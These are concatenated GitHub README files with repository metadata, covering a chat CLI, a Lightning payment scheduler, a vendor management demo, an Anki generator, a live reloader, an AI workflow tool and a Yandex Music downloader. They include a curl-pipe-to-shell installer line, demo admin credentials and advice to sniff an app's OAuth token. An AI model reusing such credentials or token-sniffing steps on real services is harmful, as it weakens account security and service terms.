## Contributing

Contributions are welcome. Please open an issue or a pull request.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
",6,1,1,MIT,release.yml,1.0
viktaur/pi6eon,master,"# Pi6eon üê¶
Like a carrier pigeon over IPv6.

## Description
Pi6eon is a minimal, direct, stateless, and end-to-end encrypted CLI app that enables direct chatting between two IPv6/TCP endpoints.

Key exchange has been implemented using the [`x25519-dalek`](https://github.com/dalek-cryptography/curve25519-dalek/tree/main/x25519-dalek) crate. The two parties generate a shared secret that is then used for symmetric message encryption using the [`aes-gcm`](https://github.com/RustCrypto/AEADs/tree/master/aes-gcm) crate. Please note that, although these two crates have been externally audited, there are no safety guarantees regarding their implementation in this project. **‚ö†Ô∏è USE AT YOUR OWN RISK ‚ö†Ô∏è**.

Finally, for communication to be possible, there needs to exist a network path free of any firewall or NAT restrictions between the two IPv6 addresses.

## Quick start
Ensure that you have the latest Rust version installed (if you don't have Rust installed, you can easily get it [here](https://www.rust-lang.org/tools/install))
```
rustup update
```

Clone the repository and execute
```
cargo build --release
```

To see the actions available
```
./target/release/pi6eon --help


Usage: pi6eon <COMMAND>

Commands:
  setup
  listen
  help    Print this message or the help of the given subcommand(s)

Options:
  -h, --help     Print help
  -V, --version  Print version
```

## Screenshots
<img width=""1512"" alt=""Screenshot 2024-09-07 at 14 25 07"" src=""https://github.com/user-attachments/assets/866b2330-6577-4c09-97d3-4314ba444545"">
<img width=""1363"" alt=""Screenshot 2024-09-07 at 14 25 25"" src=""https://github.com/user-attachments/assets/3a6ded3e-ec7f-4a1c-8682-9c1f0684310b"">
",0,0,2,,,2.0
pycanis/lnrecc,master,"# lnrecc

A tool for streamlining recurring lightning payments. Weekly pocket money for your kids? Perhaps a subscription or a regular donation? Up to you!

## Prerequisites

You need to have a gRPC API access to LND lightning node you want to spend from, which includes a macaroon and a cert file.

## Installation

Download the archive from the release page, optionally verify the signature, extract it, create the `config.yaml` with your configuration and run the executable. Or you can clone the repository and build it yourself. Or you can run it in docker.

Optional CLI parameters:

- `--config-path <path>`
- `--log-path <path>`

### Software verification (optional, but recommended)

1. Import gpg key. `gpg --keyserver hkps://keys.openpgp.org --recv-keys 54650F2C495A04B2927EDF729936610A65758899`
2. Verify signature. `gpg --verify lnrecc-*.sha256.txt.sig` MUST say `Good signature`
3. Verify hashes. `shasum -a 256 --ignore-missing --check lnrecc-*.sha256.txt` MUST say `lnrecc-*.tar.gz OK`

### Default config

```
macaroon_path: ""/home/my-user/.lnd/data/chain/bitcoin/mainnet/admin.macaroon""
cert_path: ""/home/my-user/.lnd/tls.cert""
server_url: ""https://localhost:10009""
jobs:
  - name: ""My first job""
    schedule: ""0 30 9,12,15 1,15 May-Aug Mon,Wed,Fri 2018/2""
    amount_sats: 10000
    ln_address_or_lnurl: ""nick@domain.com""
    max_fee_sats: 5
    memo: ""Scheduled payment coming your way!""
```

Currently, `server_url` mustn't be an IP address, otherwise you run into `InvalidDNSNameError`. If lnd is not running locally and you don't have a domain name for it, add `<ip address> lnd` to your `/etc/hosts` and then in config.yaml use `server_url: ""https://lnd:10009""`

`schedule` is a cron-like syntax extended by seconds field (first one) and optionally also year. Here are a few examples:

- `0 * * * * *` run every minute
- `0 */5 * * * *` run every 5 minutes
- `0 30 12 * * *` run every day at 12:30 PM
- `0 0 9 * * 1` run every Monday at 9:00 AM
- `0 0 6 1 * *` run on the first of every month at 6:00 AM

All job times are currently in UTC.

## Upcoming features

- Ability to spend from Core Lightning
- Bolt12
- Posibility to set up notifications after every payment
- Specify timezones
- Whatever else comes up

## Contributing

Open to PRs!
",2,0,1,GPL-3.0,,0.0
prameswaraandhika/vendor-management-system-rest,master,"# Vendor Management System (VMS)

This project is a Vendor Management System built using Java. The application is containerized and can be run using Docker.

## Table of Contents
- [Prerequisites](#prerequisites)
- [Build the Docker Image](#build-the-docker-image)
- [Run the Application](#run-the-application)
- [Stop and Remove the Container](#stop-and-remove-the-container)
- [Accessing the Application](#accessing-the-application)
- [Accessing the API Documentation](#accessing-the-api-documentation)
- [JWT Authentication for Admin Operations](#jwt-authentication-for-admin-operations)
- [Rate Limiting on /auth/login](#rate-limiting-on-authlogin)
- [Troubleshooting](#troubleshooting)
- [Additional Notes](#additional-notes)

## Prerequisites

Before running the application, ensure you have the following installed on your machine:
- [Docker](https://docs.docker.com/get-docker/) (Version 20.x or higher recommended)

## Build the Docker Image

1. Clone the repository to your local machine:

    ```bash
    git clone https://github.com/your-username/vendor-management-system.git
    cd vendor-management-system
    ```

2. Ensure that the `Dockerfile` is present in the project root directory.

3. Build the Docker image using the following command:

    ```bash
    docker build -t vms-demo .
    ```

    - **`vms-demo`**: The tag name for the image. You can change it to anything you prefer.
    - **`.`**: This specifies the current directory where the Dockerfile is located.

4. Once the image is built, verify it by listing your Docker images:

    ```bash
    docker images
    ```

   You should see the image `vms-demo` in the list.

## Run the Application

1. Run the Docker container using the image you just built:

    ```bash
    docker run -p 8081:8081 --name vms-demo-rest vms-demo
    ```

    - **`-p 8081:8081`**: Maps port `8081` of the Docker host to port `8081` in the container where the application is listening.
    - **`--name vms-demo-rest`**: Gives a name to the running container.
    - **`vms-demo`**: The name of the image to run.

2. After running the command, the application will start inside the container and expose port `8081`.

## Stop and Remove the Container

To stop the container, run the following command:

```bash
docker stop vms-demo-rest
```

To remove the container after stopping it:

```bash
docker rm vms-demo-rest
```

## Accessing the Application

Once the application is running, you can access it in your browser by visiting:

```
http://localhost:8081
```

This will display the application running inside the Docker container.

## Accessing the API Documentation

The application includes API documentation using Swagger. You can access the Swagger UI by visiting:

```
http://localhost:8081/swagger-ui/index.html
```

This will provide the full documentation for all available REST operations in the Vendor Management System.

## JWT Authentication for Admin Operations

To perform any operations on the `/admin/vendor` endpoint, you must authenticate using JWT (JSON Web Token). Follow these steps to obtain and use the token:

### Steps for Authenticating:

1. **Log in as Admin**: Use the admin credentials to log in and retrieve your JWT token:
    - **username**: `budi@example.com`
    - **Password**: `password123`
2. **Access Authorization Header**:
    - When interacting with endpoints that require authorization, include the JWT token in the `Authorization` header.
    - The format for the header is as follows:
      ```
      Authorization: Bearer <your-jwt-token>
      ```

3. **Visual Guidance**:
    - In the API documentation (Swagger UI), click on the **lock icon** to add your JWT token for secured endpoints.
    - The following image demonstrates where to find the lock icon:

      ![JWT Lock Icon](icon_jwt.png)

4. **Example**: After clicking the lock icon, enter the JWT token in the popup dialog and press **Authorize**. This will authorize your requests for protected endpoints. Refer to the image below for an example of the JWT token insertion process:

   ![JWT Authorization Example](dialog_jwt.png)

### Ensure Admin Role

Make sure the authenticated user has the `ROLE_ADMIN` assigned to access this endpoint.

## Rate Limiting on `/auth/login`

This application implements rate limiting on the `/auth/login` endpoint using **Resilience4j**. The rate limiter restricts the number of login attempts to enhance security and prevent abuse.

### Rate Limiting Configuration:

- **Requests per period**: Only 1 login attempt is allowed per client within a 5-second window.
- **Limit refresh period**: The rate limit is reset every 5 seconds.
- **Timeout duration**: If the rate limit is exceeded, the system will wait up to 2 seconds for the limit to reset before returning an error.
- **Health monitoring**: Rate limiter metrics and health status are available for monitoring.

### How it Works:

When a client makes a login request to the `/auth/login` endpoint, the following rate limiting rules apply:

1. **1 request per 5 seconds**: Each client can make only one login attempt every 5 seconds.
2. **Timeout handling**: If more than one login request is made within the 5-second window, the client will receive a `429 Too Many Requests` error after a 2-second wait time.
3. **Health metrics**: The rate limiter is registered with the health monitoring system to provide visibility into the rate limiting status.

### Example Response for Exceeding the Limit:

If the client exceeds the allowed number of login attempts, they will receive a `429 Too Many Requests` response:

```json
{
  ""now"": ""2024-10-04T09:40:06.4396832"",
  ""message"": ""RateLimiter 'login' does not permit further calls""
}
```

### Accessing Rate Limiter Health Metrics:

To monitor the health of the rate limiter, access the application's health metrics, which will show the rate limiting status for the `/auth/login` endpoint. The health metrics can be used to observe the number of available permits and other statistics.

---

This section will help users understand how rate limiting is applied to the `/auth/login` endpoint and what to expect when the rate limit is exceeded.
## Troubleshooting

- **Container won‚Äôt start**: Ensure the image is built properly using `docker build`.
- **Port conflict**: Make sure port `8081` on your host machine is not being used by another application. If it is, you can change the host port when running the container, e.g., `-p 8082:8081` to map the container's `8081` to the host's `8082`.
- **Check container logs**: If there‚Äôs an issue, you can check the container logs by running:

    ```bash
    docker logs vms-demo-rest
    ```

## Additional Notes

- You can list all running containers with:

    ```bash
    docker ps
    ```

- To view all containers, including stopped ones, use:

    ```bash
    docker ps -a
    ```

--- 

This enhanced **README.md** now includes instructions for accessing the Swagger API documentation and how to use JWT authentication for admin operations.",0,0,2,,,2.0
methuz/Wordcraft,main,"# Readme

## About Wordcraft

Wordcraft is an intelligent tool designed to streamline language learning by automatically generating customized Anki cards. Wordcraft leverages OpenAI‚Äôs API to create flashcards that suit your specific learning needs.

## Motivation

I find that many language learning software programs do not meet my needs. For example, Duolingo can be too easy for learning English and cannot be customized to focus on what I want to learn.

I‚Äôve found that Anki is one of the best tools for learning any language. Anki uses cognitive science techniques such as active recall and spaced repetition to help users with memorization. The name comes from the Japanese word for ""memorization.""

Anki serves me well, and I find that many community-made decks help me get started with new languages. However, my main issue is that I often want decks in specific areas, such as colors in Japanese. To address this, I need to create my own decks, which is very time-consuming.

That‚Äôs why I created this project: to use the LLM's API (ChatGPT, Ollama) to automatically generate cards and add them to Anki.

I aim to create a graphical user interface (GUI) and implement Retrieval-Augmented Generation (RAG). The RAG feature will fetch known words from the user‚Äôs existing Anki decks, enabling the AI to assess the user‚Äôs language level and automatically generate lessons that are appropriately tailored to their needs.

This is my first public project built in Rust. Feel free to submit pull requests or request features.

## Milestone

 - [x] It works!
 - [x] Can add cards to existing deck
 - [x] Support any language
 - [x] Custom card type, Add example and solution
 - [x] Support local LLM
 - [ ] GUI
 - [ ] Automated generate audio
 - [ ] fetch word from Anki if existing deck is provided
 - [ ] Refactor & Test Coverage
 - [ ] Executable file (BIN)
 - [ ] Retrieval Augmented Generation (RAG) : Fetch user's known words from Anki and generate lesson using AI


### Anki

Anki can be used on Website at https://ankiweb.net/decks.
Anki download : https://apps.ankiweb.net/
Anki connect and how to install : https://ankiweb.net/shared/info/2055492159


You need your own OpenAPI Key to use this project
https://platform.openai.com/api-keys

### Create .env file

ANKI_CONNECT_URL=http://[Machine's IP]:[Port] (Optional)
OPEN_API_KEY={Your OPEN API KEY} 

### How to run on WSL

1. Config AnkiConnect to bind to 0.0.0.0
{
  ""webBindAddress"": ""0.0.0.0"",
  ""webBindPort"": 8765,
  // ... other settings
}

2. Add filewall rule
wf.msc

3. Find Windows IP
ip route | grep default | awk '{print $3}'

4. Manually set Windows IP in .env file
ANKI_CONNECT_URL=http://[Window IP]:8765


",0,0,1,,,0.0
aalowlevel/typestate-builder,master,"# typestate-builder

`TypestateBuilder` is a Rust procedural macro that enables the creation of builder patterns using the typestate design pattern. This macro ensures that your structs are built in a way that enforces compile-time safety, ensuring that required fields are initialized before the struct is created.

For more informatiion, read [the document](https://docs.rs/typestate-builder/latest/typestate_builder/).

## License

`TypestateBuilder` is dual-licensed under the MIT and Apache 2.0 licenses. See the LICENSE-MIT and LICENSE-APACHE files for details.
",0,0,3,Apache-2.0,,0.0
ak9024/rustywatch,main,"# RustyWatch

![GitHub Actions Workflow Status](https://img.shields.io/github/actions/workflow/status/ak9024/rustywatch/cd.yml?style=flat&label=deployment) 
![GitHub Actions Workflow Status](https://img.shields.io/github/actions/workflow/status/ak9024/rustywatch/ci.yml?branch=main&style=plastic&label=lint) ![Crates.io Total Downloads](https://img.shields.io/crates/d/rustywatch) 
![Crates.io License](https://img.shields.io/crates/l/rustywatch) 
![docs.rs](https://img.shields.io/docsrs/rustywatch?style=social) ![Crates.io Size](https://img.shields.io/crates/size/rustywatch?style=flat) ![GitHub Repo stars](https://img.shields.io/github/stars/ak9024/rustywatch) 
![GitHub Tag](https://img.shields.io/github/v/tag/ak9024/rustywatch) 
![Crates.io Version](https://img.shields.io/crates/v/rustywatch) 
![Codecov](https://img.shields.io/codecov/c/github/ak9024/rustywatch)

[![asciicast](https://asciinema.org/a/678683.svg)](https://asciinema.org/a/678683)

## Live Reloading Built with Rust

Inspired by [Go Air](https://github.com/air-verse/air), RustyWatch provides powerful live reloading capabilities designed for developers working across various programming languages.

## Features

- Universal Live Reloading: Seamlessly supports live reloading for any programming language.
- Real-time Binary Reloading: Automatically reloads your binaries in real-time.
- Monorepo Development Support: Effortlessly manage monorepo projects with built-in support.
- Multi-Project Execution: Run multiple projects concurrently with a single command.
- Optimized Build Process: Efficient and highly optimized for faster builds and reloading.
- Automatic Directory Monitoring: Detects and tracks new directories without manual intervention.
- Enhanced Logging: Enjoy colorful and detailed log outputs for easier debugging and monitoring.

## Install

> curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

```shell
cargo install rustywatch
```

## Usage

To start the project, ensure you have a `rustywatch.yaml` configuration file in the root directory of your project. Then, run the CLI from the root directory to launch RustyWatch.

## Configuration

The default configuration file is named `rustywatch.yaml`, and it must be located in your project's root directory. For a reference configuration, please see the example below:


```yaml
# define workspaces, rustywatch can be handled multi project at the same time.
workspaces:
  # first project binary apps
  - dir: 'golang-project' # define path directory
    cmd: # define command to build binary
    - cp ./golang-project/.env .env
    - |
      cd ./golang-project;
      go build main.go
    bin_path: './golang-projec/main' # define path for binary location
    bin_arg: # define arguments
     - server
    ignore:
     - '.git'
  # second project binary apps
  - dir: 'rust-project'
    cmd:
    - |
      cd ./rust-project;
      cargo build
    bin_path: './rust-project/target/debug/rust-project'
  # third project non binary apps
  - dir: 'nodejs-project'
    cmd: 'cd nodejs-project;npm run dev'
  # more ...
```

```shell
# list directories
ls 
.
‚îî‚îÄ‚îÄ your-project/
    ‚îú‚îÄ‚îÄ go-project/
    ‚îÇ   ‚îú‚îÄ‚îÄ go.mod
    ‚îÇ   ‚îú‚îÄ‚îÄ go.sum
    ‚îÇ   ‚îî‚îÄ‚îÄ main.go
    ‚îú‚îÄ‚îÄ rust-project/
    ‚îÇ   ‚îú‚îÄ‚îÄ src/
    ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ main.rs
    ‚îÇ   ‚îú‚îÄ‚îÄ Cargo.toml
    ‚îÇ   ‚îî‚îÄ‚îÄ Cargo.lock
    ‚îú‚îÄ‚îÄ nodejs-project/
    ‚îÇ   ‚îú‚îÄ‚îÄ index.js
    ‚îÇ   ‚îú‚îÄ‚îÄ package.json
    ‚îÇ   ‚îî‚îÄ‚îÄ package-lock.json
    ‚îî‚îÄ‚îÄ rustywatch.yaml (config here)
```

### Run the project

```shell
rustywatch
```

## Help

```
rustywatch --help
```

## Update version

```shell
cargo install rustywatch
```

## Support languages

- Go
- Rust
- Bun
- Node.js
- (more)

## Star History

<a href=""https://star-history.com/#ak9024/rustywatch&Timeline"">
 <picture>
   <source media=""(prefers-color-scheme: dark)"" srcset=""https://api.star-history.com/svg?repos=ak9024/rustywatch&type=Timeline&theme=dark"" />
   <source media=""(prefers-color-scheme: light)"" srcset=""https://api.star-history.com/svg?repos=ak9024/rustywatch&type=Timeline"" />
   <img alt=""Star History Chart"" src=""https://api.star-history.com/svg?repos=ak9024/rustywatch&type=Timeline"" />
 </picture>
</a>

## License

MIT & Apache-2.0
",24,5,1,Apache-2.0,"cd.yml,ci.yml",36.0
Rvn0xsy/Qpipe,main,"# Qpipe

Qpipe ÊòØ‰∏Ä‰∏™AIÂ∑•‰ΩúÊµÅÂ∑•ÂÖ∑ÔºåÁõÆÂâçÈõÜÊàê‰∫ÜÂÖçË¥πÁöÑÊô∫Ë∞±ÂºÄÊîæÂπ≥Âè∞-GLM-4Ê®°ÂûãÔºåÁî®Êà∑ÂèØ‰ª•ÈÄöËøáËá™ÂÆö‰πâYAMLÊ†ºÂºèÁöÑÊñá‰ª∂Êù•ËÆæÁΩÆÂÆöÊó∂‰ªªÂä°Â∑•‰ΩúÊµÅÁªÑ„ÄÇ

## Quickstart

**ÂèÇÊï∞‰ªãÁªç**

```bash
$ Qpipe -h
Usage: Qpipe [OPTIONS]

Options:
  -c, --config <FILE>  Sets a custom config file
  -d, --debug          
  -h, --help           Print help
  -V, --version        Print version
$ Qpipe -c /path/to/config.yaml
```
ÈÄöËøáÊåáÂÆöYAMLÊñá‰ª∂Êù•Â£∞ÊòéÂ∑•‰ΩúÊµÅÈÖçÁΩÆÔºåÂ∞±ÂèØ‰ª•‰∏éAI‰∫§‰∫í‰∫Ü„ÄÇ

**ÊâßË°åÊµÅÁ®ã**

ÂêØÂä®QpipeÂêéÔºåÂÆÉÂ∞Ü‰ºöËß£ÊûêÈÖçÁΩÆÊñá‰ª∂ÂêØÂä®Â§öÁ∫øÁ®ãÂ§ÑÁêÜ‰ªªÂä°ÁªÑÔºåÈÄöËøáÊØè‰∏™‰ªªÂä°ÁªÑ‰∏≠ÁöÑ`prompt`ÂØπAIËøõË°åÈ¢ÑËÆæÔºåÂÜçÁî±ÂØπÂ∫îÁöÑ`stream`ËÑöÊú¨‰∏éÊú¨Âú∞ÁöÑAI‰∏≠ËΩ¨ÊúçÂä°ËøõË°å‰∫§‰∫í„ÄÇ

**ÈÖçÁΩÆÊñá‰ª∂ÁªìÊûÑ**

```yaml
# model ÈªòËÆ§‰∏çÈúÄË¶ÅÊõ¥Êîπ | glm-4-flash ÊòØÂÖçË¥πÊ®°Âûã
model: ""glm-4-flash""
# api_key ÈÄöËøáÈìæÊé•Ëé∑ÂèñÔºö https://open.bigmodel.cn/usercenter/apikeys
api_key: """" 
url: ""https://open.bigmodel.cn/api/paas/v4/chat/completions"" # ÈªòËÆ§‰∏çÈúÄË¶ÅÊõ¥Êîπ
server: ""127.0.0.1:3000"" # AI‰∏≠ËΩ¨ÊúçÂä°ÁõëÂê¨Âú∞ÂùÄ

process_group:
  # ÊØè‰∏Ä‰∏™ Group ËßÜ‰∏∫‰∏Ä‰∏™‰ªªÂä°ÁªÑÔºåÂåÖÂê´‰∫Ü ‰ªªÂä°ÂêçÁß∞„ÄÅÂÆöÊó∂‰ªªÂä°Ë°®ËææÂºè„ÄÅPrompt„ÄÅStream
  - name: ""history_analysis""
    cron: ""0/60 * * * * *""
    prompt: >
      ‰Ω†Áé∞Âú®ÊòØ‰∏Ä‰∏™LinuxÊìç‰ΩúÁ≥ªÁªü‰∏ìÂÆ∂ÔºåËØ∑Â∏ÆÊàëÂàÜÊûêÊâßË°åÁöÑÂéÜÂè≤ÂëΩ‰ª§ÔºåÁªôÂá∫‰∏ÄÊÆµËØùÊÄªÁªì„ÄÇ
    stream: ""/path/to/script/history.sh""

  - name: ""document_search""
    cron: ""now""
    prompt: >
      ËØ∑Âú®ÊàëÊèê‰æõÁöÑÊñáÊ°£‰∏≠ÊâæÂá∫ Fofa/fofa ÊêúÁ¥¢ËØ≠Âè•ÔºåÂπ∂ËøîÂõû ÊêúÁ¥¢ËØ≠Âè•ÔºåÊåâÁÖßÂ¶Ç‰∏ãÊ†ºÂºèËæìÂá∫Ôºö
      <Query>{ËØ≠Âè•}</Query>
      # ‰∏æ‰æã
      app=""abc""
      body=""def""
    stream: ""/path/to/script/request_doc.py""

```

## ‰∏≠ËΩ¨ÊúçÂä°ÁöÑ‰∫§‰∫íÊµÅÁ®ã

‰∏æ‰æãÔºåÊàëÊúâ‰∏Ä‰∏™ÈÖçÁΩÆÊñá‰ª∂Â¶Ç‰∏ãÔºö

```yaml
model: ""glm-4-flash""
api_key: ""secrets"" 
url: ""https://open.bigmodel.cn/api/paas/v4/chat/completions""
# AI‰∏≠ËΩ¨ÊúçÂä°ÁõëÂê¨Âú∞ÂùÄ
server: ""127.0.0.1:3000""

process_group:
  - name: ""history_analysis""
    cron: ""0/60 * * * * *""
    prompt: >
      ‰Ω†Áé∞Âú®ÊòØ‰∏Ä‰∏™LinuxÊìç‰ΩúÁ≥ªÁªü‰∏ìÂÆ∂ÔºåËØ∑Â∏ÆÊàëÂàÜÊûêÊâßË°åÁöÑÂéÜÂè≤ÂëΩ‰ª§ÔºåÁªôÂá∫‰∏ÄÊÆµËØùÊÄªÁªì„ÄÇ
    stream: ""/path/to/script/history.sh""
```
Âú®BashËÑöÊú¨‰∏≠ÂèØ‰ª•ÂÖàPOSTËØ∑Ê±Ç`127.0.0.1:3000/{name}`ÔºåËØ∑Ê±Ç‰Ωì‰∏≠ÂèëÈÄÅË¶ÅÂñÇÁªôAIË¶ÅÂ§ÑÁêÜÁöÑÊï∞ÊçÆÔºåÊúçÂä°Á´Ø‰ºöÂú®`Header`Â§¥‰∏≠ËøîÂõû`‰ªªÂä°ID`ÔºåÁÑ∂ÂêéÂÜçÈÄöËøá`GET`ËØ∑Ê±ÇËØªÂèñAIÂ§ÑÁêÜÁöÑÁªìÊûúÔºàGETËØ∑Ê±ÇÁöÑHeaderÂ§¥‰∏≠ÈúÄË¶ÅÊê∫Â∏¶`‰ªªÂä°ID`Ôºâ„ÄÇ

```bash
#!/bin/zsh
# /path/to/script/history.sh
# Ëé∑ÂèñÂΩìÂâçÊó•Êúü
today=$(date +%Y-%m-%d)

# ÊâßË°å atuin history list ÂëΩ‰ª§Âπ∂ËøáÊª§Âá∫ÂΩìÂ§©ÁöÑËÆ∞ÂΩïÔºåÁÑ∂Âêé‰øùÂ≠òÂà∞‰∏Ä‰∏™ÂèòÈáè‰∏≠
today_commands=$(atuin history list | while read -r line; do
    # ‰ªéÊØèË°å‰∏≠ÊèêÂèñÊó•Êúü
    date_in_line=$(echo ""$line"" | awk '{print $1}')

    # ÊØîËæÉÊó•ÊúüÊòØÂê¶‰∏∫‰ªäÂ§©
    if [[ ""$date_in_line"" == ""$today"" ]]; then
        echo ""$line""
    fi
done)

# ÊâìÂç∞‰øùÂ≠òÁöÑÂëΩ‰ª§ÂéÜÂè≤
echo ""$today_commands""

# ‰ΩøÁî® curl ÂèëÈÄÅ‰ªäÂ§©ÂëΩ‰ª§ÂéÜÂè≤Âà∞ÊúçÂä°Âô®ÔºåÂπ∂ÊèêÂèñÂìçÂ∫îÂ§¥‰∏≠ÁöÑ Process-ID
response=$(curl -X POST http://127.0.0.1:3000/history_analysis -d ""$today_commands"" -i)

# ÊèêÂèñ Process-ID ÂìçÂ∫îÂ§¥ÁöÑÂÄº
process_id=$(echo ""$response"" | grep ""Process-ID"" | awk '{print $2}' | tr -d '\r')

# ÊâìÂç∞ Process-ID
echo ""Process ID: $process_id""

curl -X GET http://127.0.0.1:3000/history_analysis -H ""Process-ID: $process_id""
```

## Ê°à‰æã

- Êï∞ÊçÆÂàÜÊûê‰∏éÊÄªÁªìÔºöÂàÜÊûêÂΩìÊó•Á≥ªÁªü‰∏äÊâßË°åÁöÑÂëΩ‰ª§ÔºåÂπ∂ÁªôÂá∫ÊñáÂ≠óÊÄªÁªì
- Êï∞ÊçÆÊèêÂèñÔºö[ÊèêÂèñÁΩëÁªúÁ©∫Èó¥ÊêúÁ¥¢ÂºïÊìéËØ≠Âè•](https://payloads.online/archivers/2024-09-08/extract-vuln-search-queries/)
- ...

## TODO

-[ ] ÊîØÊåÅOpenAI",2,0,1,,release.yaml,0.0
Leafwing-Studios/i-cant-believe-its-not-bsn,main,"# i-cant-believe-its-not-bsn

An ergonomic way to spawn Bevy entity hierarchies using component hooks and the magic of the type system.

Eagerly [waiting for BSN](https://github.com/bevyengine/bevy/discussions/14437)?
Really wish you could spawn hierarchies with less boilerplate?
Just want to define some reusable widget types for `bevy_ui` in code?

Try `WithChild`, or its iterator sibling, `WithChildren`!
Just add it as a component holding the bundle you want to use to spawn the child, and you're off to the races.
A component hook will see that this component has been added, extract the data from your `WithChild` component, and then move it into a child, cleaning itself up as it goes.

Have fun!
",0,5,1,Apache-2.0,,2.0
Synphonyte/leptos-bevy-canvas,main,"# Leptos Bevy Canvas

[![Crates.io](https://img.shields.io/crates/v/leptos-bevy-canvas.svg)](https://crates.io/crates/leptos-bevy-canvas)
[![Docs](https://docs.rs/leptos-bevy-canvas/badge.svg)](https://docs.rs/leptos-bevy-canvas/)
[![MIT/Apache 2.0](https://img.shields.io/badge/license-MIT%2FApache-blue.svg)](https://github.com/synphonyte/leptos-bevy-canvas#license)
[![Build Status](https://github.com/synphonyte/leptos-bevy-canvas/actions/workflows/ci.yml/badge.svg)](https://github.com/synphonyte/leptos-bevy-canvas/actions/workflows/ci.yml)
[![built with Codeium](https://codeium.com/badges/main)](https://codeium.com)

<!-- cargo-rdme start -->

Embed an idiomatic Bevy app inside your Leptos app with ease.

## Features

- **Easy to use** - Simply embed your Bevy app inside your Leptos app with the [`BevyCanvas`] component.
- **Idiomatic** - This crate doesn't want you to do anything differently in the way you write
  your Bevy app or your Leptos app. It just gives you the tools for them to communicate.
- **Events** - Send events in either or both directions between your Bevy app and your Leptos app.
- **Resource signals** - Synchronize Bevy `Resource`s with `RwSignal`s in your Leptos app.

## Example

```rust
use bevy::prelude::*;
use leptos::prelude::*;
use leptos_bevy_canvas::prelude::*;

#[derive(Event)]
pub struct TextEvent {
    pub text: String,
}

#[component]
pub fn App() -> impl IntoView {
    // This initializes a sender for the Leptos app and
    // a receiver for the Bevy app
    let (text_event_sender, bevy_text_receiver) = event_l2b::<TextEvent>();

    let on_input = move |evt| {
        // send the event over to Bevy
        text_event_sender
            .send(TextEvent { text: event_target_value(&evt) })
            .ok();
    };

    view! {
        <input type=""text"" on:input=on_input />

        <BevyCanvas
            init=move || {
                // Pass the receiver into the Bevy app initialization
                init_bevy_app(bevy_text_receiver)
            }

            {..}
            width=""300""
            height=""500""
        />
    }
}

// In Bevy it ends up just as a normal event
pub fn set_text(
    mut event_reader: EventReader<TextEvent>,
) {
    for event in event_reader.read() {
        // do something with the event
    }
}

// This initializes a normal Bevy app
fn init_bevy_app( text_receiver: BevyEventReceiver<TextEvent>) -> App {
    let mut app = App::new();
    app
        .add_plugins(
            DefaultPlugins.set(WindowPlugin {
                primary_window: Some(Window {
                    // ""#bevy_canvas"" is the default and can be
                    // changed in the <BevyCanvas> component
                    canvas: Some(""#bevy_canvas"".into()),
                    ..default()
                }),
                ..default()
            }),
        )
        // import the event here into Bevy
        .import_event_from_leptos(text_receiver)
        .add_systems(Update, set_text);

    app
}
```

<!-- cargo-rdme end -->

## Compatibility

| Crate version | Compatible Leptos version | Compatible Bevy version |
|---------------|---------------------------|-------------------------|
| 0.1           | 0.7                       | 0.15                    |
",1,0,1,Apache-2.0,"book.yml,cd.yml,ci.yml,github-release.yml,tests.yml",0.0
Sorrow446/Yandex-Music-Downloader,main,"# Yandex-Music-Downloader
Yandex Music (–Ø–Ω–¥–µ–∫—Å –ú—É–∑—ã–∫–∞) downloader written in Rust with lossless support.
![](https://i.imgur.com/mQrzTfQ.png)    
[Pre-compiled binaries](https://github.com/Sorrow446/Yandex-Music-Downloader/releases)

## Setup
Input token into config file (config.toml).
Configure any other options if needed.
|Option|Info|
| --- | --- |
|token|Required to auth.|
|format|Track download quality. 1 = AAC 64, 2 = AAC 192, 3 = AAC 256 / MP3 320, 4 = FLAC.|
|out_path|Where to download to. Path will be made if it doesn't already exist.|
|keep_covers|Keep covers in album folder.|
|write_covers|Write covers to tracks.|
|sleep|Sleep between each track processing to prevent potential rate-limiting.|
|original_covers|Get original covers for tracks; may be large sometimes. true = orignal, false = 1000x1000|

## Token Acquisition
**Plus subscription required.**    

|Type|Lossless|Lifetime|How to get|
| --- | --- | --- | --- |
|Desktop|yes|1 year|https://github.com/Sorrow446/Yandex-Music-Downloader/tree/token_extractor|
|Android|yes|1 year|Sniff the Android app; look for the Authorization header. `OAuth xxxx...`|
|Web|no|1 month?|https://yandex-music.readthedocs.io/en/main/token.html|


## Supported Media
Wrap any URLs that contain params in double quotes if running on Windows.

|Type|URL example|
| --- | --- |
|Album|`https://music.yandex.ru/album/33134482`
|Artist albums|`https://music.yandex.ru/artist/9838127`, `https://music.yandex.ru/artist/9838127/albums`
|Track|`https://music.yandex.ru/album/2955514/track/25128596`
|User playlist|`https://music.yandex.ru/users/user@gmail.com/playlists/1000`
|User favourites|`https://music.yandex.ru/users/user@gmail.com/playlists/3`

Other users' favourites and playlists are also supported, but they must be set to public.

## Usage
Args take priority over the config file.

Download two albums:   
`ym-dl.exe -u https://music.yandex.ru/album/33134482 https://music.yandex.ru/album/33199228`

Download a single album and from a text file containing links:   
`ym-dl.exe -u https://music.yandex.ru/album/33134482 G:\1.txt`

```
Usage: ym-dl.exe [OPTIONS] --urls <URLS>...

Options:
  -f, --format <FORMAT>      1 = AAC 64, 2 = AAC 192, 3 = AAC 256 / MP3 320, 4 = FLAC.
  -g, --get-original-covers  Get original covers for tracks; may be large sometimes. true = orignal, false = 1000x1000.
  -k, --keep-covers          Keep covers in album folder.
  -o, --out-path <OUT_PATH>  Output path.
  -s, --sleep                Sleep between each track processing to prevent potential rate-limiting.
      --write-covers         Write covers to tracks.
      --write-lyrics         Write timed lyrics when available.
  -u, --urls <URLS>...
  -h, --help                 Print help
```

## –î–ª—è —Ä—É—Å—Å–∫–∏—Ö:
